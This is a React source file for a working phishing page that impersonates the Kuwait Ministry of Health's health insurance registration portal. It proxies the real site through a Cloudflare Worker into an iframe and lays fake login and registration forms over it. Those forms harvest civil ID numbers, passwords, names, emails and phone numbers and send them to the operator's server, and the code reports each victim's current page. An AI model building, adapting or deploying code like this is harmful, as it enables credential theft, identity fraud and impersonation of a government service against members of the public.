import { useState, useEffect, useRef } from 'react';
import { submitData, updatePage, socket } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';

// Track which page the iframe is showing based on postMessage from Worker
type IframePage = 'logaction' | 'login' | 'register' | 'services' | 'unknown';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const [iframePage, setIframePage] = useState<IframePage>('logaction');
  const [showLoginOverlay, setShowLoginOverlay] = useState(false);
  const [showRegisterOverlay, setShowRegisterOverlay] = useState(false);
  const [overlayFading, setOverlayFading] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Login form state
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  // Register form state
  const [regCivilId, setRegCivilId] = useState('');
  const [regName, setRegName] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPhone, setRegPhone] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regConfirmPassword, setRegConfirmPassword] = useState('');

  // Listen for navigation messages from Worker's injected script
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data && event.data.type === 'moh-navigation') {
        const path = event.data.path || '';
        console.log('MOH Navigation:', path);
        
        if (path.includes('/Insurance/login') || path.includes('/Insurance/Login')) {
          setIframePage('login');
          setShowLoginOverlay(true);
          updatePage('صفحة تسجيل الدخول');
        } else if (path.includes('/Insurance/Register') || path.includes('/Insurance/register')) {
          setIframePage('register');
          setShowRegisterOverlay(true);
          updatePage('صفحة إنشاء حساب');
        } else if (path.includes('/Insurance/logaction') || path.includes('/Insurance/Logaction')) {
          setIframePage('logaction');
          updatePage('الصفحة الرئيسية');
        } else {
          setIframePage('unknown');
          updatePage('صفحة الخدمات');
        }
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  // Update page on load
  useEffect(() => {
    updatePage('الصفحة الرئيسية');
  }, []);

  // Fade out overlay and hide it
  const fadeOutOverlay = (setter: (v: boolean) => void) => {
    setOverlayFading(true);
    setTimeout(() => {
      setter(false);
      setOverlayFading(false);
    }, 300);
  };

  // Handle login submit
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!civilId || !password) {
      setLoginError('يرجى إدخال الرقم المدني وكلمة المرور');
      return;
    }
    setLoginError('');

    // Send captured data to server
    submitData({
      'الرقم المدني': civilId,
      'كلمة المرور': password,
      'نوع النموذج': 'تسجيل دخول',
    }, false);

    console.log('Login data captured:', { civilId, password });

    // Hide overlay and let user interact with iframe
    fadeOutOverlay(setShowLoginOverlay);
  };

  // Handle register submit
  const handleRegisterSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Send captured data to server
    submitData({
      'الرقم المدني': regCivilId,
      'الاسم': regName,
      'البريد الإلكتروني': regEmail,
      'رقم الهاتف': regPhone,
      'كلمة المرور': regPassword,
      'تأكيد كلمة المرور': regConfirmPassword,
      'نوع النموذج': 'إنشاء حساب جديد',
    }, false);

    console.log('Register data captured');

    // Hide overlay and let user interact with iframe
    fadeOutOverlay(setShowRegisterOverlay);
  };

  return (
    <div style={{
      width: '100vw',
      height: '100vh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
    }}>
      {/* Loading spinner */}
      {loading && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: '#f0f4f8',
          zIndex: 10000,
          direction: 'rtl',
          fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60,
            height: 60,
            border: '4px solid #e0e0e0',
            borderTop: '4px solid #1a7a4c',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* Login Overlay */}
      {showLoginOverlay && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          background: '#e8e8e8',
          zIndex: 10001,
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          direction: 'rtl',
          fontFamily: 'Tahoma, Arial, sans-serif',
          opacity: overlayFading ? 0 : 1,
          transition: 'opacity 0.3s ease',
          overflowY: 'auto',
        }}>
          {/* Header */}
          <div style={{
            width: '100%',
            background: '#1b3a4b',
            padding: '20px 0',
            textAlign: 'center',
            color: 'white',
          }}>
            <img 
              src={WORKER_BASE + '/img/FMOHLogo.svg'} 
              alt="شعار وزارة الصحة"
              style={{ width: 80, height: 80, margin: '0 auto 10px' }}
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
            <h1 style={{ fontSize: 22, fontWeight: 'bold', margin: 0 }}>
              النظام الآلي لتسجيل الضمان الصحي
            </h1>
          </div>

          {/* Login Form */}
          <div style={{
            maxWidth: 500,
            width: '90%',
            margin: '40px auto',
            background: 'white',
            borderRadius: 8,
            padding: '30px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
          }}>
            <h2 style={{
              fontSize: 20,
              color: '#1b3a4b',
              marginBottom: 5,
              textAlign: 'center',
              fontWeight: 'bold',
            }}>
              تسجيل الدخول
            </h2>
            <p style={{
              fontSize: 14,
              color: '#666',
              marginBottom: 25,
              textAlign: 'center',
            }}>
              أدخل بياناتك للدخول إلى النظام
            </p>

            <form onSubmit={handleLoginSubmit}>
              <div style={{ marginBottom: 20 }}>
                <label style={{
                  display: 'block',
                  marginBottom: 8,
                  fontSize: 14,
                  color: '#333',
                  fontWeight: 'bold',
                }}>
                  الرقم المدني
                </label>
                <input
                  type="text"
                  value={civilId}
                  onChange={(e) => setCivilId(e.target.value)}
                  placeholder="أدخل الرقم المدني"
                  style={{
                    width: '100%',
                    padding: '12px 15px',
                    border: '1px solid #ddd',
                    borderRadius: 6,
                    fontSize: 16,
                    direction: 'ltr',
                    textAlign: 'right',
                    boxSizing: 'border-box',
                    outline: 'none',
                  }}
                  onFocus={(e) => e.target.style.borderColor = '#2196F3'}
                  onBlur={(e) => e.target.style.borderColor = '#ddd'}
                />
              </div>

              <div style={{ marginBottom: 20 }}>
                <label style={{
                  display: 'block',
                  marginBottom: 8,
                  fontSize: 14,
                  color: '#333',
                  fontWeight: 'bold',
                }}>
                  كلمة المرور
                </label>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="أدخل كلمة المرور"
                  style={{
                    width: '100%',
                    padding: '12px 15px',
                    border: '1px solid #ddd',
                    borderRadius: 6,
                    fontSize: 16,
                    direction: 'ltr',
                    textAlign: 'right',
                    boxSizing: 'border-box',
                    outline: 'none',
                  }}
                  onFocus={(e) => e.target.style.borderColor = '#2196F3'}
                  onBlur={(e) => e.target.style.borderColor = '#ddd'}
                />
              </div>

              {loginError && (
                <p style={{ color: 'red', fontSize: 13, marginBottom: 15, textAlign: 'center' }}>
                  {loginError}
                </p>
              )}

              <button
                type="submit"
                style={{
                  width: '100%',
                  padding: '14px',
                  background: '#2196F3',
                  color: 'white',
                  border: 'none',
                  borderRadius: 6,
                  fontSize: 16,
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  transition: 'background 0.2s',
                }}
                onMouseOver={(e) => (e.target as HTMLButtonElement).style.background = '#1976D2'}
                onMouseOut={(e) => (e.target as HTMLButtonElement).style.background = '#2196F3'}
              >
                تسجيل الدخول
              </button>
            </form>

            <div style={{ textAlign: 'center', marginTop: 20 }}>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  fadeOutOverlay(setShowLoginOverlay);
                  // Navigate iframe to register page
                  if (iframeRef.current) {
                    iframeRef.current.src = WORKER_BASE + '/Insurance/Register';
                  }
                }}
                style={{
                  color: '#2196F3',
                  fontSize: 14,
                  textDecoration: 'none',
                }}
              >
                إنشاء حساب جديد
              </a>
            </div>
          </div>

          {/* Footer */}
          <p style={{
            color: 'red',
            fontSize: 14,
            textAlign: 'center',
            marginTop: 20,
            marginBottom: 30,
          }}>
            تم تفعيل الخدمة يوميا على مدى 24 ساعة
          </p>
        </div>
      )}

      {/* Register Overlay */}
      {showRegisterOverlay && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          background: '#e8e8e8',
          zIndex: 10001,
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          direction: 'rtl',
          fontFamily: 'Tahoma, Arial, sans-serif',
          opacity: overlayFading ? 0 : 1,
          transition: 'opacity 0.3s ease',
          overflowY: 'auto',
        }}>
          {/* Header */}
          <div style={{
            width: '100%',
            background: '#1b3a4b',
            padding: '20px 0',
            textAlign: 'center',
            color: 'white',
          }}>
            <img 
              src={WORKER_BASE + '/img/FMOHLogo.svg'} 
              alt="شعار وزارة الصحة"
              style={{ width: 80, height: 80, margin: '0 auto 10px' }}
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
            <h1 style={{ fontSize: 22, fontWeight: 'bold', margin: 0 }}>
              النظام الآلي لتسجيل الضمان الصحي
            </h1>
          </div>

          {/* Register Form */}
          <div style={{
            maxWidth: 500,
            width: '90%',
            margin: '30px auto',
            background: 'white',
            borderRadius: 8,
            padding: '30px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
          }}>
            <h2 style={{
              fontSize: 20,
              color: '#1b3a4b',
              marginBottom: 5,
              textAlign: 'center',
              fontWeight: 'bold',
            }}>
              إنشاء حساب جديد
            </h2>
            <p style={{
              fontSize: 14,
              color: '#666',
              marginBottom: 25,
              textAlign: 'center',
            }}>
              أدخل بياناتك لإنشاء حساب جديد
            </p>

            <form onSubmit={handleRegisterSubmit}>
              {[
                { label: 'الرقم المدني', value: regCivilId, setter: setRegCivilId, type: 'text', placeholder: 'أدخل الرقم المدني' },
                { label: 'الاسم الكامل', value: regName, setter: setRegName, type: 'text', placeholder: 'أدخل الاسم الكامل' },
                { label: 'البريد الإلكتروني', value: regEmail, setter: setRegEmail, type: 'email', placeholder: 'أدخل البريد الإلكتروني' },
                { label: 'رقم الهاتف', value: regPhone, setter: setRegPhone, type: 'tel', placeholder: 'أدخل رقم الهاتف' },
                { label: 'كلمة المرور', value: regPassword, setter: setRegPassword, type: 'password', placeholder: 'أدخل كلمة المرور' },
                { label: 'تأكيد كلمة المرور', value: regConfirmPassword, setter: setRegConfirmPassword, type: 'password', placeholder: 'أعد إدخال كلمة المرور' },
              ].map((field, i) => (
                <div key={i} style={{ marginBottom: 18 }}>
                  <label style={{
                    display: 'block',
                    marginBottom: 8,
                    fontSize: 14,
                    color: '#333',
                    fontWeight: 'bold',
                  }}>
                    {field.label}
                  </label>
                  <input
                    type={field.type}
                    value={field.value}
                    onChange={(e) => field.setter(e.target.value)}
                    placeholder={field.placeholder}
                    style={{
                      width: '100%',
                      padding: '12px 15px',
                      border: '1px solid #ddd',
                      borderRadius: 6,
                      fontSize: 16,
                      direction: 'ltr',
                      textAlign: 'right',
                      boxSizing: 'border-box',
                      outline: 'none',
                    }}
                    onFocus={(e) => e.target.style.borderColor = '#2196F3'}
                    onBlur={(e) => e.target.style.borderColor = '#ddd'}
                  />
                </div>
              ))}

              <button
                type="submit"
                style={{
                  width: '100%',
                  padding: '14px',
                  background: '#2196F3',
                  color: 'white',
                  border: 'none',
                  borderRadius: 6,
                  fontSize: 16,
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  marginTop: 10,
                  transition: 'background 0.2s',
                }}
                onMouseOver={(e) => (e.target as HTMLButtonElement).style.background = '#1976D2'}
                onMouseOut={(e) => (e.target as HTMLButtonElement).style.background = '#2196F3'}
              >
                إنشاء حساب
              </button>
            </form>

            <div style={{ textAlign: 'center', marginTop: 20 }}>
              <a
                href="#"
                onClick={(e) => {
                  e.preventDefault();
                  fadeOutOverlay(setShowRegisterOverlay);
                  setShowLoginOverlay(true);
                }}
                style={{
                  color: '#2196F3',
                  fontSize: 14,
                  textDecoration: 'none',
                }}
              >
                لديك حساب؟ تسجيل الدخول
              </a>
            </div>
          </div>
        </div>
      )}

      {/* The actual iframe */}
      <iframe
        ref={iframeRef}
        src={WORKER_BASE + '/Insurance/logaction'}
        onLoad={() => setLoading(false)}
        style={{
          width: '100%',
          height: '100%',
          border: 'none',
        }}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
      />
    </div>
  );
}
